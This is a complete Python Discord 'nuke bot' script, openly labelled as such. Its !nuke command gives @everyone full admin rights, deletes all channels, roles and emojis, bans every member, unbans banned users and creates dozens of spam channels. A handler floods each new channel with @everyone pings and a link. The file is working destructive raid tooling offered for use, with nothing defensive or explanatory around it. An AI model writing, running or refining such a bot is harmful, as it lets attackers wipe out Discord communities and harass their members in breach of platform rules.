import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio

token = "BOT_TOKEN_HERE"  # Replace with your bot token

SPAM_CHANNELS = ["Oops1", "Oops2"]  # Replace with actual channel names
SPAM_MESSAGES = ["@everyone https://cdn.discordapp.com/attachments/1439567435026923666/1454234445346504774/caption-4weasd.gif?ex=698e4f5e&is=698cfdde&hm=1d7b6809da165daa970051be7dda543eed21efec3aef829dccf6643324edf418"]  # Replace with your spam messages

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.bans = True
intents.emojis = True

client = commands.Bot(command_prefix="!", intents=intents)

@client.event
async def on_ready():
    print("NUKE BOT READY")
    print("Support Server: https://discord.gg/2CVQcpPVej")
    await client.change_presence(activity=discord.Game(name="LOVELY BOT"))

@client.command()
@commands.is_owner()
async def stop(ctx):
    await ctx.bot.logout()
    print(Fore.GREEN + f"{client.user.name} has logged out successfully." + Fore.RESET)

@client.command()
@commands.is_owner()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    
    print(Fore.YELLOW + f"Starting nuke on {guild.name}..." + Fore.RESET)
    
    try:
        everyone_role = discord.utils.get(guild.roles, name="@everyone")
        await everyone_role.edit(permissions=Permissions.all())
        print(Fore.MAGENTA + "✓ Gave @everyone admin permissions" + Fore.RESET)
    except Exception as e:
        print(Fore.GREEN + f"✗ Failed to give everyone admin: {e}" + Fore.RESET)
    
    # Delete channels
    print(Fore.CYAN + "Deleting channels..." + Fore.RESET)
    for channel in guild.channels[:]:  # Copy list to avoid modification during iteration
        try:
            await channel.delete()
            print(Fore.MAGENTA + f"  ✓ {channel.name}" + Fore.RESET)
        except:
            print(Fore.RED + f"  ✗ {channel.name}" + Fore.RESET)
    
    # Ban members
    print(Fore.CYAN + "Banning members..." + Fore.RESET)
    for member in guild.members:
        if member == client.user:
            continue
        try:
            await member.ban()
            print(Fore.MAGENTA + f"  ✓ {member.name}#{member.discriminator}" + Fore.RESET)
        except:
            print(Fore.RED + f"  ✗ {member.name}#{member.discriminator}" + Fore.RESET)
    
    # Delete roles
    print(Fore.CYAN + "Deleting roles..." + Fore.RESET)
    for role in guild.roles[1:]:  # Skip @everyone role
        try:
            await role.delete()
            print(Fore.MAGENTA + f"  ✓ {role.name}" + Fore.RESET)
        except:
            print(Fore.RED + f"  ✗ {role.name}" + Fore.RESET)
    
    # Delete emojis
    print(Fore.CYAN + "Deleting emojis..." + Fore.RESET)
    for emoji in list(guild.emojis):
        try:
            await emoji.delete()
            print(Fore.MAGENTA + f"  ✓ {emoji.name}" + Fore.RESET)
        except:
            print(Fore.RED + f"  ✗ {emoji.name}" + Fore.RESET)
    
    # Unban users
    print(Fore.CYAN + "Unbanning users..." + Fore.RESET)
    try:
        banned_users = await guild.bans()
        for ban_entry in banned_users:
            user = ban_entry.user
            try:
                await guild.unban(user)
                print(Fore.MAGENTA + f"  ✓ {user.name}#{user.discriminator}" + Fore.RESET)
            except:
                print(Fore.RED + f"  ✗ {user.name}#{user.discriminator}" + Fore.RESET)
    except:
        pass
    
    # Create spam channels
    print(Fore.CYAN + "Creating spam channels..." + Fore.RESET)
    try:
        spam_channel = await guild.create_text_channel("First Channel")
        link = await spam_channel.create_invite(max_age=0, max_uses=0)
        print(Fore.BLUE + f"Invite: {link}" + Fore.RESET)
    except:
        pass
    
    amount = 50  # Reduced to avoid rate limits
    for i in range(amount):
        try:
            await guild.create_text_channel(random.choice(SPAM_CHANNELS))
        except:
            pass
    
    print(Fore.GREEN + f"✓ NUKED {guild.name} SUCCESSFULLY!" + Fore.RESET)

@client.event
async def on_guild_channel_create(channel):
    while channel.permissions_for(channel.guild.me).send_messages:
        try:
            await channel.send(random.choice(SPAM_MESSAGES))
            await asyncio.sleep(2)
        except:
            break

if __name__ == "__main__":
    client.run(token)
